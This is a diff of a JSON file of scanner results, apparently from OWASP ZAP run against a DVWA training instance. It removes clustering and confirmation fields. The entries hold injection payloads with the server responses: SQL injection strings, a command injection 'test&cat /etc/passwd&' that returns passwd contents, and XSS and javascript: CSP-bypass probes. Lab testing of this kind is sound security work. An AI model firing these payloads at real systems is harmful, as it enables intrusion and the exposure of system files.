@@ -2,7 +2,6 @@
   "base": "http://192.168.153.200/DVWA/",
   "items": [
     {
-      "clusterKey": "GET|vulnerabilities/brute|querystring|username",
       "target": {
         "endpoint": "vulnerabilities/brute/?username=%27&password=test&Login=Login",
         "method": "GET",
@@ -15,11 +14,9 @@
       "payloads": [
         "'"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:48:22 GMT; Max-Age=86400; path=/\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] You have an error in your SQL syntax\n[Context] <br /> <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '098f6bcd4621d373cade4e832627b4f6'' at line 1 in /va\n[Reflection] your MySQL server version for the right syntax to use near '098f6bcd4621d373cade4e832627b4f6'' at line 1 in /var/www/html/DVWA/vulnerabiliti",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:48:22 GMT; Max-Age=86400; path=/\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] You have an error in your SQL syntax\n[Context] <br /> <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '098f6bcd4621d373cade4e832627b4f6'' at line 1 in /va\n[Reflection] your MySQL server version for the right syntax to use near '098f6bcd4621d373cade4e832627b4f6'' at line 1 in /var/www/html/DVWA/vulnerabiliti"
     },
     {
-      "clusterKey": "POST|vulnerabilities/csp|form|include",
       "target": {
         "endpoint": "vulnerabilities/csp/",
         "method": "POST",
@@ -32,11 +29,9 @@
       "payloads": [
         "javascript:alert(1);"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:43 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\n\n[ZAP Evidence] javascript:alert(1);\n[Context] ity Policy (CSP) Bypass</h1> <div class=\"vulnerable_code_area\"> <script src='javascript:alert(1);'></script> <form name=\"csp\" method=\"POST\"> <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:43 GMT; Max-Age=86400; path=/\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] javascript:alert(1);\n[Context] ity Policy (CSP) Bypass</h1> <div class=\"vulnerable_code_area\"> <script src='javascript:alert(1);'></script> <form name=\"csp\" method=\"POST\"> <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to"
     },
     {
-      "clusterKey": "POST|vulnerabilities/exec|form|ip",
       "target": {
         "endpoint": "vulnerabilities/exec/",
         "method": "POST",
@@ -49,11 +44,9 @@
       "payloads": [
         "test&cat /etc/passwd&"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:48:07 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] root:x:0:0\n[Context] <input type=\"submit\" name=\"Submit\" value=\"Submit\"> </p> </form> <pre>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:48:07 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] root:x:0:0\n[Context] <input type=\"submit\" name=\"Submit\" value=\"Submit\"> </p> </form> <pre>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x"
     },
     {
-      "clusterKey": "GET|vulnerabilities/sqli|querystring|id",
       "target": {
         "endpoint": "vulnerabilities/sqli/?id=%27&Submit=Submit",
         "method": "GET",
@@ -66,11 +59,9 @@
       "payloads": [
         "'"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:46:25 GMT; Max-Age=86400; path=/\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] You have an error in your SQL syntax\n[Context] <br /> <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1 in /var/www/html/DVWA/vulnerabilitie\n[Reflection] your MySQL server version for the right syntax to use near ''''' at line 1 in /var/www/html/DVWA/vulnerabilities/sqli/source/low.php:11 Stac",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:46:25 GMT; Max-Age=86400; path=/\nContent-Type: text/html; charset=UTF-8\n\n[ZAP Evidence] You have an error in your SQL syntax\n[Context] <br /> <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1 in /var/www/html/DVWA/vulnerabilitie\n[Reflection] your MySQL server version for the right syntax to use near ''''' at line 1 in /var/www/html/DVWA/vulnerabilities/sqli/source/low.php:11 Stac"
     },
     {
-      "clusterKey": "GET|vulnerabilities/sqli_blind|querystring|id",
       "target": {
         "endpoint": "vulnerabilities/sqli_blind/?id=test%27+AND+%271%27%3D%271%27+--+&Submit=Submit",
         "method": "GET",
@@ -83,11 +74,9 @@
       "payloads": [
         "test' OR '1'='1' --"
       ],
-      "response": "HTTP/1.1 404 Not Found\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:46:04 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8",
-      "confirmReflection": true
+      "response": "HTTP/1.1 404 Not Found\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:46:04 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8"
     },
     {
-      "clusterKey": "GET|vulnerabilities/xss_r|querystring|name",
       "target": {
         "endpoint": "vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cpre%3E",
         "method": "GET",
@@ -100,11 +89,9 @@
       "payloads": [
         "</pre><scrIpt>alert(1);</scRipt><pre>"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:38 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </pre><scrIpt>alert(1);</scRipt><pre>\n[Context] \"> <input type=\"submit\" value=\"Submit\"> </p> </form> <pre>Hello </pre><scrIpt>alert(1);</scRipt><pre></pre> </div> <h2>More Information</h2> <ul> <li><a href=\"https://owasp.org/www-community/attacks/xss/\" target=\"_blank\">https://owasp.org/w",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:38 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </pre><scrIpt>alert(1);</scRipt><pre>\n[Context] \"> <input type=\"submit\" value=\"Submit\"> </p> </form> <pre>Hello </pre><scrIpt>alert(1);</scRipt><pre></pre> </div> <h2>More Information</h2> <ul> <li><a href=\"https://owasp.org/www-community/attacks/xss/\" target=\"_blank\">https://owasp.org/w"
     },
     {
-      "clusterKey": "POST|vulnerabilities/xss_s|form|btnSign",
       "target": {
         "endpoint": "vulnerabilities/xss_s/",
         "method": "POST",
@@ -117,11 +104,9 @@
       "payloads": [
         "</div><scrIpt>alert(1);</scRipt><div>"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na"
     },
     {
-      "clusterKey": "POST|vulnerabilities/xss_s|form|mtxMessage",
       "target": {
         "endpoint": "vulnerabilities/xss_s/",
         "method": "POST",
@@ -134,11 +119,9 @@
       "payloads": [
         "</div><scrIpt>alert(1);</scRipt><div>"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na"
     },
     {
-      "clusterKey": "POST|vulnerabilities/xss_s|form|txtName",
       "target": {
         "endpoint": "vulnerabilities/xss_s/",
         "method": "POST",
@@ -151,11 +134,9 @@
       "payloads": [
         "</div><scrIpt>alert(1);</scRipt><div>"
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:45:29 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] </div><scrIpt>alert(1);</scRipt><div>\n[Context] 5pz4p<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: </div><scrIpt>alert(1);</scRipt><div><br />Message: test content<br /></div> <div id=\"guestbook_comments\">Name: test<br />Message: test content<br /></div> <div id=\"guestbook_comments\">Na"
     },
     {
-      "clusterKey": "GET|hackable||",
       "target": {
         "endpoint": "hackable/",
         "method": "GET",
@@ -171,7 +152,6 @@
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable</title> </head> <body> <h1>Index of /DVWA/hackable</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O="
     },
     {
-      "clusterKey": "GET|hackable/flags||",
       "target": {
         "endpoint": "hackable/flags/",
         "method": "GET",
@@ -187,7 +167,6 @@
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/flags</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/flags</title> </head> <body> <h1>Index of /DVWA/hackable/flags</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?"
     },
     {
-      "clusterKey": "GET|hackable/uploads||",
       "target": {
         "endpoint": "hackable/uploads/",
         "method": "GET",
@@ -203,7 +182,6 @@
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/uploads</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/uploads</title> </head> <body> <h1>Index of /DVWA/hackable/uploads</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href="
     },
     {
-      "clusterKey": "GET|hackable/users||",
       "target": {
         "endpoint": "hackable/users/",
         "method": "GET",
@@ -219,7 +197,6 @@
       "response": "HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\n\n[ZAP Evidence] <title>Index of /DVWA/hackable/users</title>\n[Context] <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <html> <head> <title>Index of /DVWA/hackable/users</title> </head> <body> <h1>Index of /DVWA/hackable/users</h1> <table> <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?"
     },
     {
-      "clusterKey": "GET|instructions.php||",
       "target": {
         "endpoint": "instructions.php",
         "method": "GET",
@@ -235,7 +212,6 @@
       "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:52 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] Can't connect to local\n[Context] could get is this:</p> <pre><code class=\"language-mariadb\">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)</code></pre> <p>This is not an authentication issue but tells you that the database ser"
     },
     {
-      "clusterKey": "GET|vulnerabilities/captcha||",
       "target": {
         "endpoint": "vulnerabilities/captcha/",
         "method": "GET",
@@ -251,7 +227,6 @@
       "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:49 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
     },
     {
-      "clusterKey": "POST|vulnerabilities/captcha||",
       "target": {
         "endpoint": "vulnerabilities/captcha/",
         "method": "POST",
@@ -267,11 +242,9 @@
         ""
       ],
       "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:49 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <b>Warning</b>:  Undefined array key \"g-recaptcha-response\" in <b>/var/www/html/DVWA/vulnerabilities/captcha/source/low.php</b> on line <b>14</b><br />\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <",
-      "confirmReflection": true,
       "repeat": 2
     },
     {
-      "clusterKey": "GET|vulnerabilities/csp||Content-Security-Policy",
       "target": {
         "endpoint": "vulnerabilities/csp/",
         "method": "GET",
@@ -288,11 +261,10 @@
         "",
         ""
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:42 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:42 GMT; Max-Age=86400; path=/\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
       "repeat": 3
     },
     {
-      "clusterKey": "POST|vulnerabilities/csp||Content-Security-Policy",
       "target": {
         "endpoint": "vulnerabilities/csp/",
         "method": "POST",
@@ -309,12 +281,10 @@
         "",
         ""
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:42 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
-      "confirmReflection": true,
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:42 GMT; Max-Age=86400; path=/\nContent-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;",
       "repeat": 3
     },
     {
-      "clusterKey": "POST|vulnerabilities/upload||",
       "target": {
         "endpoint": "vulnerabilities/upload/",
         "method": "POST",
@@ -327,11 +297,9 @@
       "payloads": [
         ""
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:47 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <b>Warning</b>:  Undefined array key \"uploaded\" in <b>/var/www/html/DVWA/vulnerabilities/upload/source/low.php</b> on line <b>6</b><br />",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:47 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <b>Warning</b>:  Undefined array key \"uploaded\" in <b>/var/www/html/DVWA/vulnerabilities/upload/source/low.php</b> on line <b>6</b><br />"
     },
     {
-      "clusterKey": "GET|vulnerabilities/captcha||https://www.google.com/recaptcha/api.js",
       "target": {
         "endpoint": "vulnerabilities/captcha/",
         "method": "GET",
@@ -347,7 +315,6 @@
       "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:49 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
     },
     {
-      "clusterKey": "POST|vulnerabilities/captcha||https://www.google.com/recaptcha/api.js",
       "target": {
         "endpoint": "vulnerabilities/captcha/",
         "method": "POST",
@@ -360,8 +327,7 @@
       "payloads": [
         ""
       ],
-      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:49 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <",
-      "confirmReflection": true
+      "response": "HTTP/1.1 200 OK\nSet-Cookie: security=low; path=/ || PHPSESSID=1lsg7f8o7fjg75agf20t0dp7gi; expires=Sat, 16 May 2026 03:38:49 GMT; Max-Age=86400; path=/\nContent-Type: text/html;charset=utf-8\n\n[ZAP Evidence] <script src='https://www.google.com/recaptcha/api.js'></script>\n[Context] <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\"><br /> <script src='https://www.google.com/recaptcha/api.js'></script> <br /> <div class='g-recaptcha' data-theme='dark' data-sitekey=''></div> <br /> <input type=\"submit\" value=\"Change\" name=\"Change\"> <"
     }
   ]
 }
